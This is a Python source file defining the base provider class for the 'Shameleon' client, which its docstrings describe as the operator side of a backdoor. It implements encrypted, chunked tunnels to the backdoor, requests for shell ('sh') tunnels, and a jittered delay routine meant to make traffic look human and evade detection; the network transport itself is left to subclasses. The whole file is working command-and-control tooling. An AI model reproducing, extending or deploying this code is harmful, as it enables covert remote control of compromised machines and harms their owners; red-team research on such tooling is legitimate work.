from __future__ import annotations

import asyncio
import sys
from pkgutil import iter_modules
from queue import Queue
from uuid import uuid4

from cryptography.fernet import Fernet

from shameleon_client.profile import Profile


class ShameleonProvider():
    """ Class representing a Shameleon provider.

    Shameleon providers are used to communicate with the Shameleon backdoor.
    They are used by modules to send and receive data from the backdoor.
    The ShameleonProvider class is a base class that must be inherited by
    specific providers.
    """
    _PROVIDERS: dict[str, type[ShameleonProvider]] = {}

    def __init__(self, profile: Profile):
        super().__init__()
        self._profile = profile
        self._crypto = Fernet(self._profile.backdoor_secret.encode('utf-8'))
        self._tunnels: dict[str, dict[str, Queue]] = {
            'system': {'in': Queue(), 'out': Queue()},
        }
        self._buffers: dict[str, str] = {
            'system': '',
        }
        self._current_delay = self._profile.backdoor_min_delay / 1000

    async def _humanize(self, is_active: bool = True):
        await asyncio.sleep(self._current_delay)
        if is_active:
            self._current_delay = self._profile.backdoor_min_delay / 1000
        else:
            self._current_delay = self._current_delay * (1 + self._profile.backdoor_factor_delay)
            if self._current_delay > self._profile.backdoor_max_delay / 1000:
                self._current_delay = self._profile.backdoor_max_delay / 1000

    async def run(self):
        """ Run the provider.

        This method is used to run the provider. It will send and receive data
        from the backdoor.
        """
        try:
            while True:
                # Send chuncks
                buffer: list[str] = []
                for _, streams in self._tunnels.items():
                    while not streams['out'].empty():
                        buffer.append(streams['out'].get(block=False))
                if len(buffer) > 0:
                    await self._send_payload(buffer)
                # Receive chuncks
                incoming = await self._get_payload()
                if len(incoming) > 0:
                    for tunnel_id, data in incoming:
                        self._tunnels[tunnel_id]['in'].put(data)
                await self._humanize(len(buffer) > 0 or len(incoming) > 0)
        except asyncio.CancelledError:
            pass

    async def request_tunnel(self, tunnel_type: str) -> str:
        """ Request a tunnel to the backdoor.

        This method is used to request a tunnel to the backdoor. The tunnel
        will be used to send and receive data from the backdoor.
        The tunnel is identified by a unique identifier returned by this
        method.

        Args:
            tunnel_type (str): Type of tunnel to request (e.g. 'sh')

        Raises:
            Exception: If the backdoor is unable to create the tunnel

        Returns:
            str: Unique identifier of the tunnel
        """
        print(f"[*] Requesting tunnel for '{tunnel_type}'")
        tunnel_uuid = str(uuid4()).split('-', maxsplit=1)[0]
        content = f"{tunnel_type}:{tunnel_uuid}"
        self.send_data("system", content.encode('utf-8'))
        while True:  # TODO: add a timeout ?
            incomming = self.receive_data("system")
            if len(incomming) == 0:
                await asyncio.sleep(0.1)
                continue
            decoded_data = incomming.decode('utf-8')
            if decoded_data != 'OK':
                raise ConnectionError('Impossible to create tunnel: %s', decoded_data)
            print("[i] tunnel ID:", tunnel_uuid)
            self._tunnels[tunnel_uuid] = {'in': Queue(), 'out': Queue()}
            self._buffers[tunnel_uuid] = ''
            return tunnel_uuid

    def send_data(self, tunnel_id: str, data: bytes):
        """ Send data to the backdoor.

        This method is used to send data to the backdoor through a tunnel.
        The tunnel is identified by its unique identifier.

        Args:
            tunnel_id (str): Unique identifier of the tunnel
            data (bytes): Data to send to the backdoor
        """
        # Encryption
        encrypted_data = self._crypto.encrypt(data)
        # Split data
        for chunk in self._split_data(encrypted_data, tunnel_id):
            packet = f"{tunnel_id}:{chunk.decode('utf-8')}"
            self._tunnels[tunnel_id]['out'].put(packet)

    def receive_data(self, tunnel_id: str) -> bytes:
        """ Receive data from the backdoor.

        This method is used to receive data from the backdoor through a tunnel.
        The tunnel is identified by its unique identifier.

        Args:
            tunnel_id (str): Unique identifier of the tunnel

        Returns:
            bytes: Data received from the backdoor
        """
        data = b''
        while not self._tunnels[tunnel_id]['in'].empty():
            encrypted = self._tunnels[tunnel_id]['in'].get(block=False)
            # Partial data
            if encrypted[-1] == '!' and len(encrypted) == self._profile.packet_size - len(tunnel_id) + 1:
                self._buffers[tunnel_id] += encrypted[:-1]
                continue
            encrypted = self._buffers[tunnel_id] + encrypted
            decrypted = self._crypto.decrypt(encrypted.encode('utf-8'))
            self._buffers[tunnel_id] = ''
            data += decrypted
        return data

    def not_handled_data(self, tunnel_id: str, data: bytes):
        """ Put not handled data in the queue.

        This method is used to put data in the queue of a tunnel. This data
        will be processed again by others modules.

        Args:
            tunnel_id (str): Unique identifier of the tunnel
            data (bytes): data to put in the reception queue
        """
        encrypted = self._crypto.encrypt(data)
        self._tunnels[tunnel_id]['in'].put(encrypted)

    def _split_data(self, data: bytes, tunel_id: str) -> list[bytes]:
        if self._profile.packet_size == 0:
            return [data]
        header_len = len(tunel_id) + 1
        if header_len + len(data) <= self._profile.packet_size:
            return [data]
        results: list[bytes] = []
        for i in range(0, len(data), self._profile.packet_size - 1):
            results.append(data[i:i + self._profile.packet_size - 1] + b'!')
        return results

    # Must be implemented
    async def _send_payload(self, data: list[str]):
        raise NotImplementedError()

    async def _get_payload(self) -> list[tuple[str, str]]:
        raise NotImplementedError()

    # Following methods are helpers that can be used

    @property
    def base_class(self):
        return self.__class__.__bases__[0].__name__

    @classmethod
    def _module_collection(cls):
        return sys.modules[cls.__module__.rsplit('.', 1)[0]]

    @classmethod
    def _load_modules(cls):
        for submodule in iter_modules(cls._module_collection().__path__):
            if submodule.name in ('base',):
                continue
            module = __import__(
                f"{cls._module_collection().__name__}.{submodule.name.lower()}",
                fromlist=[''],
            )
            module_name = getattr(module, 'PROVIDER_NAME')
            module_class = getattr(module, f"{module_name.title()}{cls.__name__}")
            cls._PROVIDERS[module_name] = module_class

    @classmethod
    def available_modules(cls) -> list[type[ShameleonProvider]]:
        if len(cls._PROVIDERS) == 0:
            cls._load_modules()
        return list(cls._PROVIDERS.values())

    @classmethod
    def get_module_from_name(cls, module_name) -> type[ShameleonProvider]:
        if len(cls._PROVIDERS) == 0:
            cls._load_modules()
        return cls._PROVIDERS[module_name]
